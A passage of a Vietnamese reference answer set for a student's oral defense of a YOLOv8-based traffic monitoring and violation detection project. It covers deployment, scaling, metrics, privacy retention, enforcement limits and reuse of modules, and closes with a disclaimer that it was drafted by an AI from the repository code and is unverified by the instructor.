**177.** Môi trường dev hiện tại chạy trực tiếp qua `uvicorn` không có TLS/HTTPS, không có reverse proxy (Nginx/Caddy) đứng trước để cân bằng tải/cache/nén, không có process manager tự khởi động lại khi crash. Triển khai thực tế cần: HTTPS (mã hóa dữ liệu), reverse proxy (bảo mật + hiệu năng), và process manager/container orchestration (đảm bảo uptime, tự phục hồi khi lỗi).

**178.** Có thể tách thành ít nhất 2 container: (1) container backend FastAPI + core CV logic (cần cài PyTorch/Ultralytics, thường nặng), (2) container frontend/static file serving (nhẹ, có thể dùng Nginx) — nếu mở rộng hơn nữa có thể tách riêng 1 service model serving độc lập (ví dụ dùng Triton Inference Server) để scale phần inference GPU riêng biệt khỏi phần logic nghiệp vụ.

**179.** Tách biệt giúp: (1) static file (HTML/CSS/JS) có thể được phục vụ hiệu quả hơn (cache, CDN) mà không cần đi qua toàn bộ logic xử lý của framework Python cho mỗi request tài nguyên tĩnh, (2) rõ ràng về mặt kiến trúc — phân biệt rạch ròi giữa "nội dung tĩnh không đổi" và "API động xử lý dữ liệu theo từng request".

**180.** Không scale tốt với kiến trúc hiện tại (xử lý tuần tự, giới hạn cứng 3 session). Cần redesign theo hướng: dùng message queue (RabbitMQ/Kafka) để phân phối công việc xử lý frame cho nhiều worker song song, gom nhiều frame từ nhiều camera thành 1 batch để tận dụng GPU hiệu quả hơn (GPU batching), và tách hoàn toàn phần inference model ra khỏi phần API/session management để có thể scale độc lập theo tải thực tế.

---

## M. ĐÁNH GIÁ, SO SÁNH & CÂU HỎI PHẢN BIỆN MỞ

**181.** Background Subtraction (MOG2/KNN) chỉ phân biệt "vùng chuyển động" với nền tĩnh, không phân biệt được LOẠI phương tiện, dễ bị nhiễu bởi bóng đổ/thay đổi ánh sáng/rung cây cối, và thất bại hoàn toàn khi giao thông đông đúc gần như "nền" luôn có vật thể (foreground chiếm gần hết khung hình, background model khó xây dựng đúng). Deep Learning (YOLOv8) học trực tiếp đặc trưng phân biệt từng loại xe từ dữ liệu, robust hơn nhiều với điều kiện giao thông hỗn hợp mật độ cao đặc trưng của Việt Nam.

**182.** Faster R-CNN là detector 2 giai đoạn: giai đoạn 1 (Region Proposal Network) đề xuất các vùng có khả năng chứa vật thể, giai đoạn 2 mới phân loại/tinh chỉnh box cho từng vùng đề xuất — 2 bước tuần tự tốn nhiều thời gian tính toán. YOLO là detector 1 giai đoạn (one-stage): dự đoán trực tiếp class + box cho toàn ảnh trong 1 lần forward duy nhất qua mạng — nhanh hơn nhiều nhưng đánh đổi 1 phần độ chính xác localization tinh vi so với 2-stage.

**183.** Với bài toán giám sát vi phạm có tính pháp lý, chỉ số nên ưu tiên là **Precision theo từng lớp vi phạm cụ thể** (hoặc F1-score có trọng số cao hơn cho Precision) — vì hậu quả của 1 False Positive (phạt oan người vô tội) nghiêm trọng hơn nhiều so với hậu quả của 1 False Negative (bỏ sót 1 vi phạm, vẫn có thể bị camera khác/lần khác ghi nhận), nên mAP tổng quát chưa đủ phản ánh đúng ưu tiên thực tế của ứng dụng.

**184.** Hạn chế lớn nhất theo đánh giá khách quan: hệ thống chưa có khả năng nhận diện biển số xe (ALPR) để gắn danh tính cụ thể cho vi phạm — nếu không có bước này, toàn bộ hệ thống dù chính xác về mặt AI vẫn chỉ dừng ở mức "phát hiện sự kiện" chứ chưa đủ điều kiện để chuyển thành 1 sản phẩm có giá trị pháp lý/thực tiễn thực sự trong việc xử phạt.

**185.** Nên ưu tiên (a) mở rộng PCU tính đủ 8 lớp trước tiên — vì đây là lỗi tính đúng đắn (correctness bug) ảnh hưởng trực tiếp tới độ tin cậy của toàn bộ chỉ số density đang hiển thị ngay bây giờ, sửa nhanh (thay đổi nhỏ trong code) nhưng tác động lớn tới tính đúng đắn hệ thống hiện có; trong khi (b) ALPR và (c) tối ưu tốc độ là các tính năng/cải tiến mở rộng, không phải sửa lỗi của những gì đã tuyên bố hoạt động.

**186.** Cần trả lời trung thực dựa trên hiện trạng thực tế của code: nếu `helmet_detector.py` tồn tại trong repo nhưng chưa thấy được gọi/tích hợp rõ ràng vào `video_processor.py` (luồng xử lý chính) hay không được đề cập số liệu thực nghiệm trong báo cáo, nên thẳng thắn nói đây là module đang ở giai đoạn phát triển/thử nghiệm ban đầu (proof-of-concept), chưa được tích hợp hoàn chỉnh vào pipeline sản phẩm chính — tránh nói quá lên mức độ hoàn thiện nếu hội đồng hỏi sâu và có thể kiểm tra code trực tiếp.

**187.** Giá trị thực tế hiện tại chủ yếu nằm ở mức **giám sát/thống kê/cảnh báo** (biết được có sự kiện vi phạm xảy ra, khi nào, ở đâu, kèm ảnh minh chứng hình ảnh) chứ chưa đủ để tự động xử phạt hành chính (cần xác định chính xác danh tính chủ phương tiện qua biển số). Cần bổ sung module ALPR (nhận diện biển số) tích hợp với ảnh evidence hiện có để nâng giá trị ứng dụng lên mức có thể hỗ trợ quy trình xử phạt thực tế.

**188.** Hệ thống hiện tại thuộc nhóm **giám sát/khuyến nghị** (monitoring/advisory), không phải tự động xử phạt (enforcement). Việc chuyển sang enforcement cần thêm nhiều ràng buộc: độ chính xác tối thiểu đã được kiểm định pháp lý (thường yêu cầu rất cao, gần như tuyệt đối), quy trình xác nhận có con người (human-in-the-loop) trước khi ra quyết định phạt cuối cùng, khả năng khiếu nại/xem lại bằng chứng, và tuân thủ khung pháp lý cụ thể về giám sát giao thông tự động của quốc gia.

**189.** False Positive (báo oan) gây hậu quả nghiêm trọng hơn về mặt niềm tin xã hội/pháp lý — người dân bị phạt oan mất thời gian/tiền bạc khiếu nại, làm giảm uy tín của hệ thống giám sát tự động nói chung. Hệ thống hiện tại có 1 số cơ chế giảm thiểu: `min_cross_delta_px` (chống nhiễu jitter), yêu cầu đèn thực sự "RED" đồng thời với sự kiện cắt vạch (2 điều kiện đồng thời AND), và cơ chế chống ghi log trùng — nhưng những cơ chế này chủ yếu chống trùng lặp/nhiễu kỹ thuật, chưa có bước xác nhận con người trước khi "chính thức hóa" 1 vi phạm.

**190.** Có khả năng mAP giảm đáng kể (dựa trên hiểu biết chung về domain shift trong CV, dù đồ án chưa có số liệu thực nghiệm ban đêm/mưa cụ thể) — vì đặc trưng ánh sáng/màu sắc/độ tương phản ban đêm và cảnh mưa khác biệt lớn so với phân bố dữ liệu training (chủ yếu ban ngày, thời tiết tốt theo dataset UA-DETRAC + VN mô tả trong báo cáo); cần trả lời trung thực rằng đây là dự đoán dựa trên lý thuyết domain shift, chưa phải số liệu đã đo thực tế, và nên đề xuất augmentation mô phỏng điều kiện thiếu sáng/mưa hoặc bổ sung dữ liệu training thực tế cho các điều kiện này.

**191.** CPU: chi phí phần cứng thấp, dễ triển khai đại trà (nhiều nút giao), nhưng độ trễ/FPS thấp hơn (theo benchmark báo cáo, 17-21.5 FPS cho custom model). GPU: chi phí đầu tư cao hơn nhiều lần mỗi điểm lắp đặt nhưng độ trễ thấp/FPS cao hơn đáng kể. Thiết bị edge (Jetson): chi phí trung bình, không cần truyền video về server trung tâm (giảm băng thông mạng) nhưng giới hạn về khả năng tính toán khi cần chạy đồng thời nhiều tác vụ (detect+track+density+violation). Ở quy mô toàn thành phố, chi phí hạ tầng mạng để truyền video từ hàng trăm camera về 1 server trung tâm GPU tập trung cũng là yếu tố cần cân nhắc so với triển khai edge phân tán.

**192.** Đề xuất chính sách: chỉ lưu trữ ảnh evidence trong 1 khoảng thời gian giới hạn cần thiết cho mục đích xử lý vi phạm (ví dụ theo đúng thời hạn khiếu nại pháp lý quy định), tự động xóa/ẩn danh hóa (làm mờ khuôn mặt người đi đường không liên quan tới vi phạm) sau thời hạn đó, giới hạn quyền truy cập dữ liệu evidence chỉ cho người có thẩm quyền xử lý, và có chính sách minh bạch công khai về việc thu thập/sử dụng dữ liệu giám sát này.

**193.** Điểm yếu lớn nhất so với sản phẩm thương mại: (1) chưa có ALPR tích hợp (biển số) — hầu hết hệ thống thương mại luôn có bước này làm trung tâm; (2) độ ổn định/độ tin cậy chưa được kiểm định qua thời gian dài/điều kiện thời tiết đa dạng thực tế như sản phẩm thương mại đã trải qua kiểm thử hiện trường (field testing) nhiều năm; (3) chưa có cơ chế bảo mật/xác thực API ở mức doanh nghiệp (chỉ có các biện pháp cơ bản như path traversal protection).

**194.** Tích hợp track trực tiếp trong `model.track()` của Ultralytics giúp đơn giản hóa đáng kể việc triển khai (1 API duy nhất, đã được tối ưu sẵn để hoạt động tốt với output của chính YOLOv8), giảm thời gian phát triển và số lượng phụ thuộc (dependencies) cần quản lý. Đánh đổi: ít linh hoạt hơn khi muốn tùy biến sâu thuật toán tracking (ví dụ thử nghiệm thêm Re-ID riêng như DeepSORT) so với việc tách riêng 2 module độc lập, nơi có thể thay thế/nâng cấp từng phần (detector hoặc tracker) độc lập với nhau.

**195.** Thiết kế: chạy đánh giá mAP/Precision/Recall trên **cùng 1 tập test cố định** với 2 cấu hình: (A) model COCO pretrained gốc (`yolov8s.pt`, không fine-tune) chạy trực tiếp, ánh xạ các lớp COCO gần tương đương (car, motorcycle, bus, truck) sang 8 lớp mục tiêu; (B) model đã fine-tune (`vehicle_best.pt`). So sánh chênh lệch mAP@50/mAP@50-95 giữa 2 cấu hình trên cùng tập test — chênh lệch này chính là "đóng góp thực sự" định lượng được của bước fine-tune, tách bạch rõ khỏi các yếu tố khác (kiến trúc, tracking...).

**196.** Đây là câu hội đồng dùng để kiểm tra hiểu sâu thực chất — nên chuẩn bị bằng cách tự giải thích lại (không nhìn code) toàn bộ logic `_crossed_line()` bằng lời của chính mình: lấy vị trí tâm xe trước/sau, so với `line_y`, xác định hướng di chuyển, áp ngưỡng `min_cross_delta_px` để tránh nhiễu — nếu có thể vẽ tay sơ đồ minh họa trên giấy ngay tại chỗ thì càng thuyết phục hội đồng về mức độ hiểu thật sự (không học thuộc).

**197.** Tái sử dụng được phần lớn: `core/roi.py` (ROI/point-in-polygon) gần như dùng nguyên vẹn (khái niệm "trong vùng quan tâm" giống hệt cho cả 2 bài toán), `core/tracker.py` (theo dõi track_id qua các frame) cũng tái dùng gần như nguyên vẹn. `core/density.py` (PCU) cần viết lại hoàn toàn vì khái niệm "mật độ dòng chảy" của giao thông không áp dụng cho bãi đỗ (bãi đỗ cần logic khác: xe đã đỗ bao lâu, còn chỗ trống không) — tương tự `core/violation.py` cần thiết kế lại hoàn toàn loại vi phạm khác (ví dụ đỗ sai chỗ, quá giờ) thay vì vượt đèn đỏ/sai làn.

**198.** 3 nguyên nhân: (1) **Domain shift** — video thực tế khác phân bố dữ liệu training (ánh sáng, loại camera, độ nén) → debug bằng cách thu thập thêm mẫu dữ liệu thực tế đại diện và fine-tune tiếp hoặc đánh giá lại; (2) **Góc camera khác lúc train** — nếu dữ liệu train chủ yếu quay từ 1 góc cụ thể, model có thể kém hơn ở góc khác → debug bằng cách kiểm tra phân bố góc camera trong tập train, bổ sung dữ liệu đa góc; (3) **Chất lượng nén video khác nhau** (bitrate thấp, nhiều artifact nén) → debug bằng cách so sánh trực quan chất lượng ảnh giữa tập train và video test thực tế, thử tiền xử lý (denoise) trước khi đưa vào model.

**199.** Các phần có thể coi là đóng góp kỹ thuật thực sự (không chỉ "dùng thư viện có sẵn"): logic `_crossed_line()` kết hợp ngưỡng chống nhiễu tự thiết kế, toàn bộ hệ thống quy đổi PCU đặc thù cho giao thông xe máy Việt Nam (trọng số 0.3/1.0/2.0/2.5 và các ngưỡng Normal/Crowded/Congested), thuật toán HSV + contour + circularity-scoring tự xây dựng để nhận diện đèn tín hiệu (không dùng model có sẵn), và toàn bộ pipeline merge/convert 2 dataset khác nguồn (UA-DETRAC + VN) thành 1 tập huấn luyện thống nhất 8 lớp.

**200.** Câu trả lời mang tính cá nhân — không có đáp án chuẩn duy nhất. Gợi ý lập luận mạnh: chọn module **PCU Density Estimation** (`core/density.py`) để bảo vệ, vì đây là nơi thể hiện rõ nhất khả năng **áp dụng lý thuyết CV/kỹ thuật giao thông vào bối cảnh thực tế đặc thù Việt Nam** (không chỉ chạy thẳng 1 model có sẵn), đồng thời chính module này cũng là nơi bạn tự phát hiện và có thể trình bày rõ ràng hạn chế của chính mình trước hội đồng (4/8 lớp) — thể hiện tư duy phản biện/tự đánh giá, điều mà giám khảo Thị giác Máy tính đánh giá cao hơn nhiều so với việc chỉ khoe kết quả hoàn hảo.

---

*File này là đáp án tham khảo do Claude soạn dựa trên việc đọc trực tiếp code thật trong repo và nội dung báo cáo — không phải nội dung được xác nhận bởi giảng viên hướng dẫn thực tế. Trước khi thi vấn đáp, bạn nên đối chiếu lại các câu có tính chuyên sâu (đặc biệt nhóm B, D, G) với slide bài giảng/giáo trình chính thức của học phần để đảm bảo khớp thuật ngữ giảng viên đã dạy.*